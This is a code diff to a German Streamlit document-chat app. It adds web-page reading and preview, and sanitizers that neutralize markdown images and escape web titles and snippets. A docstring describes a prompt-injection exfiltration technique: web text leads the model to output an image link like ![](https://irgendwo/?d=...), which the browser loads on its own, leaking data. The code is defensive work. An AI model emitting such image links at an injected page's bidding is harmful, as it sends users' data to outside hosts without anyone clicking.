@@ -362,6 +362,33 @@ def save_chat(chat_id, messages, titel=None):
     chats.speichere(st.session_state["username"], chat_id, messages, titel)
 
 
+_BILD_MD = re.compile(r"!\[")
+
+
+def _ohne_fremdbilder(text):
+    """Ein Bild aus einer fremden Adresse wird ein gewoehnlicher Link.
+
+    Markdown-Bilder laedt der Browser von selbst. Steht in einer Antwort
+    ![](https://irgendwo/?d=...), ruft er die Adresse auf, ohne dass
+    jemand klickt -- und was in der Adresse steht, ist dann draussen.
+    Seit es die Websuche gibt, kann fremder Text das Modell genau dazu
+    anstiften. Ein Link wird erst durch einen Klick aufgerufen.
+    """
+    # Jedes "![" und nicht nur die Form mit Klammer: Markdown kennt auch
+    # Bilder mit Verweis, ![x][1] und weiter unten [1]: https://...
+    return _BILD_MD.sub("[Bild: ", text or "")
+
+
+def _md_roh(text):
+    """Fremder Text fuer eine Markdown-Stelle: alles Steuernde maskiert.
+
+    Titel und Ausschnitte aus dem Netz stehen in Beschriftungen, die
+    Markdown auswerten. Ohne Maskieren wuerde ein Titel mit ![](...) ein
+    Bild nachladen.
+    """
+    return re.sub(r"([\\`*_{}\[\]()#+\-.!|<>~])", r"\\\1", str(text or ""))
+
+
 def _anzeigefertig(text):
     """Markdown, das AUCH halbfertig richtig aussieht.
 
@@ -376,6 +403,7 @@ def _anzeigefertig(text):
     Schlusszaun -- nur fuer die Anzeige. Gespeichert wird der
     unveraenderte Text.
     """
+    text = _ohne_fremdbilder(text)
     if text.count("```") % 2:
         return text + "\n" + "``" + "`"
     return text
@@ -1183,40 +1211,100 @@ def _bedienung_gesperrt(ja, modul=None):
 
 
 # --- SIDEBAR (UI) ---
+# Wie viele gelesene Seiten eine Sitzung im Speicher behaelt.
+_WEB_PUFFER_MAX = 20
+
+
+def _web_lesen(adresse):
+    """(text, fehler) -- die ganze Seite, je Sitzung gepuffert.
+
+    Gelesen wird ueber den Websuche-Dienst, nicht vom Browser: als reiner
+    Text, ohne Skripte, ohne Bilder, und die Seite sieht den Server statt
+    des Nutzers. Gepuffert, damit Lesen und Uebernehmen dieselbe Fassung
+    meinen -- uebernommen wird, was gelesen wurde.
+    """
+    puffer = st.session_state.setdefault("_web_puffer", {})
+    if adresse in puffer:
+        return puffer[adresse], ""
+    vb = mcp.verbinde(ohne=set(mcp.lies_konfiguration())
+                      - mcp.websuche_server())
+    text, fehler = None, "Kein Websuche-Server erreichbar."
+    try:
+        for v in vb.values():
+            try:
+                text = v.rufe("seite_lesen",
+                              {"adresse": adresse}).split("\n\n", 1)[-1]
+                break
+            except Exception as e:
+                fehler = f"{type(e).__name__}: {e}"
+    finally:
+        for v in vb.values():
+            try:
+                v.schliesse()
+            except Exception:
+                pass
+    if text is None:
+        return None, fehler
+    while len(puffer) >= _WEB_PUFFER_MAX:
+        puffer.pop(next(iter(puffer)))
+    puffer[adresse] = text
+    return text, ""
+
+
+def _web_vorschau(treffer, schluessel):
+    """Lesen vor dem Uebernehmen: Knopf, Original, gepufferter Text."""
+    offen = st.session_state.setdefault("_web_offen", set())
+    adresse = treffer["adresse"]
+    l, r = st.columns(2)
+    with l:
+        if adresse in offen:
+            if st.button("Schließen", key=f"zu_{schluessel}",
+                         use_container_width=True):
+                offen.discard(adresse)
+                st.rerun()
+        elif st.button("👁️ Lesen", key=f"lesen_{schluessel}",
+                       use_container_width=True,
+                       help="Die Seite als reiner Text, über den "
+                            "Websuche-Dienst geholt."):
+            offen.add(adresse)
+            st.rerun()
+    with r:
+        st.link_button("Original ↗", adresse, use_container_width=True,
+                       help="Öffnet die Seite direkt in deinem Browser -- "
+                            "dann sieht sie dich, nicht den Server.")
+    if adresse in offen:
+        with st.spinner("Lese ..."):
+            text, fehler = _web_lesen(adresse)
+        if text is None:
+            st.warning(f"Nicht lesbar: {fehler}")
+        else:
+            # Ein Textfeld und kein Markdown: fremder Text darf hier
+            # nichts nachladen und nichts formatieren.
+            st.text_area("Inhalt", text, height=420, disabled=True,
+                         key=f"inhalt_{schluessel}",
+                         label_visibility="collapsed")
+            st.caption(f"{len(text):,} Zeichen".replace(",", "."))
+
+
 def _web_uebernehmen(treffer):
     """Treffer der Websuche als Dokumente in den eigenen Raum.
 
-    Die ganze Seite, nicht nur der Auszug, den die Liste zeigt; geht das
-    nicht, bleibt der Auszug. Wohin, entscheidet aufnehmen: immer der
-    eigene Raum.
+    Die ganze Seite, und zwar die gelesene, wenn sie gelesen wurde.
+    Geht das Lesen nicht, bleibt der Auszug. Wohin, entscheidet
+    aufnehmen: immer der eigene Raum.
     """
-    _wvb = mcp.verbinde(ohne=set(mcp.lies_konfiguration())
-                        - mcp.websuche_server())
-    try:
-        for _w in treffer:
+    for _w in treffer:
+        _wtext, _fehler = _web_lesen(_w["adresse"])
+        if _wtext is None:
             _wtext = _w["text"]
-            for _wv in _wvb.values():
-                try:
-                    _ganz = _wv.rufe("seite_lesen",
-                                     {"adresse": _w["adresse"]})
-                    _wtext = _ganz.split("\n\n", 1)[-1]
-                    break
-                except Exception:
-                    continue
-            try:
-                _wn, _wh, _wname = aufnehmen.webseite_aufnehmen(
-                    _w["titel"], _w["adresse"], _wtext,
-                    anfrage=_w.get("anfrage", ""),
-                    benutzer_=st.session_state["username"])
-                (st.success if _wn else st.warning)(f"{_wname}: {_wh}")
-            except Exception as e:
-                st.error(f"{_w['titel']}: {type(e).__name__}: {e}")
-    finally:
-        for _wv in _wvb.values():
-            try:
-                _wv.schliesse()
-            except Exception:
-                pass
+        try:
+            _wn, _wh, _wname = aufnehmen.webseite_aufnehmen(
+                _w["titel"], _w["adresse"], _wtext,
+                anfrage=_w.get("anfrage", ""),
+                benutzer_=st.session_state["username"])
+            (st.success if _wn else st.warning)(f"{_wname}: {_wh}")
+        except Exception as e:
+            st.error(f"{_md_roh(_w['titel'])}: {type(e).__name__}: {e}")
     refresh_document_index()
 
 
@@ -2574,6 +2662,61 @@ with st.sidebar, _bedienung_gesperrt(_antwortet):
         "[AGPL-3.0](https://www.gnu.org/licenses/agpl-3.0.html) \u00b7 "
         "[Quelltext](https://github.com/mw-research/LocaNoto)")
 
+# --- QUELLEN IM NETZ SUCHEN ---
+#
+# Wie bei NotebookLM: ein Thema, eine Trefferliste, anhaken,
+# uebernehmen -- ohne dass eine Antwort entsteht. Hier braucht es
+# keine Freigabe am Raum: den Suchbegriff tippt der Nutzer selbst,
+# das Modell formuliert nichts aus den Abschnitten eines Raums.
+# Uebernommen wird immer in den eigenen Raum. Vor dem Chat und
+# unabhaengig vom Bestand: gerade wer noch nichts hat, sammelt.
+if _web_server:
+    with st.expander("🌐 Quellen im Netz suchen"):
+        with st.form("quellen_suche"):
+            _qs_anfrage = st.text_input(
+                "Thema", placeholder="Stichworte, z. B. DIN EN 1090 "
+                                     "Ausführungsklassen",
+                help="Geht an Suchmaschinen. Stichworte, keine "
+                     "Namen oder Zahlen aus internen Unterlagen.")
+            _qs_los = st.form_submit_button("Suchen",
+                                            disabled=_antwortet)
+        if _qs_los and (_qs_anfrage or "").strip():
+            _qs_vb = mcp.verbinde(ohne=set(mcp.lies_konfiguration())
+                                  - _web_server)
+            try:
+                with st.spinner("Suche ..."):
+                    _qs_text = next(iter(_qs_vb.values())).rufe(
+                        "web_suchen", {"anfrage": _qs_anfrage,
+                                       "anzahl": 10, "lesen": 0})
+                st.session_state["_quellen"] = \
+                    pipeline.webtreffer_aus_text(_qs_text)
+            except Exception as e:
+                st.error(f"Suche nicht möglich: {type(e).__name__}: {e}")
+            finally:
+                for _v in _qs_vb.values():
+                    try:
+                        _v.schliesse()
+                    except Exception:
+                        pass
+        _qs = st.session_state.get("_quellen") or []
+        if _qs:
+            _qs_wahl = []
+            for _qk, _q in enumerate(_qs):
+                if st.checkbox(f"**{_md_roh(_q['titel'])}**",
+                               key=f"qs_{_q['adresse']}"):
+                    _qs_wahl.append(_q)
+                st.caption(_md_roh(_q["adresse"]) + "  \n"
+                           + _md_roh(_q["text"][:300]))
+                _web_vorschau(_q, f"qs_{_qk}")
+                st.divider()
+            st.caption("Übernommen wird in deinen eigenen Raum, Ordner "
+                       "Suchergebnisse. Von dort verschiebst du, was "
+                       "in einen geteilten Raum gehört.")
+            if _qs_wahl and st.button(
+                    f"{len(_qs_wahl)} in meinen Raum übernehmen",
+                    key="qs_ueb", disabled=_antwortet):
+                _web_uebernehmen(_qs_wahl)
+
 # --- CHAT & RETRIEVAL ---
 #
 # Gezaehlt wird ueber die Raeume dieses Nutzers: wer in keinem Raum etwas
@@ -2582,57 +2725,6 @@ with st.sidebar, _bedienung_gesperrt(_antwortet):
 _bestand = _zahl_abschnitte(st.session_state["username"],
                             tuple(meine_raeume))
 if _bestand > 0:
-    # --- QUELLEN IM NETZ SUCHEN ---
-    #
-    # Wie bei NotebookLM: ein Thema, eine Trefferliste, anhaken,
-    # uebernehmen -- ohne dass eine Antwort entsteht. Hier braucht es
-    # keine Freigabe am Raum: den Suchbegriff tippt der Nutzer selbst,
-    # das Modell formuliert nichts aus den Abschnitten eines Raums.
-    # Uebernommen wird immer in den eigenen Raum.
-    if _web_server:
-        with st.expander("🌐 Quellen im Netz suchen"):
-            with st.form("quellen_suche"):
-                _qs_anfrage = st.text_input(
-                    "Thema", placeholder="Stichworte, z. B. DIN EN 1090 "
-                                         "Ausführungsklassen",
-                    help="Geht an Suchmaschinen. Stichworte, keine "
-                         "Namen oder Zahlen aus internen Unterlagen.")
-                _qs_los = st.form_submit_button("Suchen",
-                                                disabled=_antwortet)
-            if _qs_los and (_qs_anfrage or "").strip():
-                _qs_vb = mcp.verbinde(ohne=set(mcp.lies_konfiguration())
-                                      - _web_server)
-                try:
-                    with st.spinner("Suche ..."):
-                        _qs_text = next(iter(_qs_vb.values())).rufe(
-                            "web_suchen", {"anfrage": _qs_anfrage,
-                                           "anzahl": 10, "lesen": 0})
-                    st.session_state["_quellen"] = \
-                        pipeline.webtreffer_aus_text(_qs_text)
-                except Exception as e:
-                    st.error(f"Suche nicht möglich: {type(e).__name__}: {e}")
-                finally:
-                    for _v in _qs_vb.values():
-                        try:
-                            _v.schliesse()
-                        except Exception:
-                            pass
-            _qs = st.session_state.get("_quellen") or []
-            if _qs:
-                _qs_wahl = []
-                for _qk, _q in enumerate(_qs):
-                    if st.checkbox(f"**{_q['titel']}**",
-                                   key=f"qs_{_q['adresse']}"):
-                        _qs_wahl.append(_q)
-                    st.caption(f"{_q['adresse']}  \n{_q['text'][:300]}")
-                st.caption("Übernommen wird in deinen eigenen Raum, Ordner "
-                           "Suchergebnisse. Von dort verschiebst du, was "
-                           "in einen geteilten Raum gehört.")
-                if _qs_wahl and st.button(
-                        f"{len(_qs_wahl)} in meinen Raum übernehmen",
-                        key="qs_ueb", disabled=_antwortet):
-                    _web_uebernehmen(_qs_wahl)
-
     for i, msg in enumerate(st.session_state.messages):
         with st.chat_message(msg["role"]):
             # Angehaengte Bilder vor dem Text, so wie der Nutzer sie
@@ -2645,8 +2737,8 @@ if _bestand > 0:
                 if rohbild:
                     st.image(rohbild, width=360)
             if msg["role"] == "assistant":
-                st.write(_quellen_klickbar(msg["content"],
-                                           msg.get("sources"), i))
+                st.write(_ohne_fremdbilder(_quellen_klickbar(
+                    msg["content"], msg.get("sources"), i)))
             else:
                 st.write(msg["content"])
             if msg.get("unvollstaendig"):
@@ -2806,9 +2898,11 @@ if _bestand > 0:
                 st.markdown("🌐 **Aus dem Netz:**")
                 _web_wahl = []
                 for _wk, _w in enumerate(msg["web"]):
-                    with st.expander(f"🌐 [{_w['nr']}] {_w['titel']}"):
-                        st.caption(_w["adresse"])
-                        st.write(_w["text"][:2000])
+                    with st.expander(f"🌐 [{_w['nr']}] "
+                                     f"{_md_roh(_w['titel'])}"):
+                        st.caption(_md_roh(_w["adresse"]))
+                        st.text(_w["text"][:600])
+                        _web_vorschau(_w, f"{i}_{_wk}")
                     if st.checkbox(f"[{_w['nr']}] übernehmen",
                                    key=f"web_{i}_{_wk}"):
                         _web_wahl.append(_w)
